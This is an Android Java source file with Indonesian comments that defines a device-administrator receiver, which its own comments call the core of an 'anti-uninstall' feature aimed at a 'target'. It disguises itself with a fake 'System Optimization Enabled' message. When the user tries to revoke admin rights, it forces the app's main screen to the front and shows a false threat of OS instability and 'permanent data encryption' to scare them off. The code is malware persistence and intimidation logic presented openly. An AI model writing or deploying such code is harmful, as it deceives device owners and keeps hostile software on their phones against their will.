package com.nullx.pp;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;
import androidx.annotation.NonNull;

/**
 * AdminReceiver: Komponen Inti untuk Fitur Anti-Uninstall.
 * Dikonfigurasi untuk interupsi sistem saat target mencoba menghapus izin.
 */
public class AdminReceiver extends DeviceAdminReceiver {

    @Override
    public void onEnabled(@NonNull Context context, @NonNull Intent intent) {
        super.onEnabled(context, intent);
        // Konfirmasi aktivasi otoritas admin
        Toast.makeText(context, "System Optimization Enabled", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onDisabled(@NonNull Context context, @NonNull Intent intent) {
        super.onDisabled(context, intent);
        // Trigger alert terakhir jika pertahanan berhasil ditembus
        Toast.makeText(context, "Critical: System Security Disabled", Toast.LENGTH_LONG).show();
    }

    @Override
    public CharSequence onDisableRequested(@NonNull Context context, @NonNull Intent intent) {
        // [!] PSYCHOLOGICAL WARFARE: Pesan peringatan palsu untuk menakuti target
        
        // INTERRUPTION LOGIC: Begitu target menekan tombol nonaktif, kita paksa MainActivity naik ke depan
        Intent i = new Intent(context, MainActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
        context.startActivity(i);

        return "CRITICAL ERROR: Disabling this system component will result in immediate OS instability and permanent data encryption.";
    }

    @Override
    public void onPasswordChanged(@NonNull Context context, @NonNull Intent intent) {
        super.onPasswordChanged(context, intent);
        // Logika tambahan jika target mengubah password lockscreen
    }
}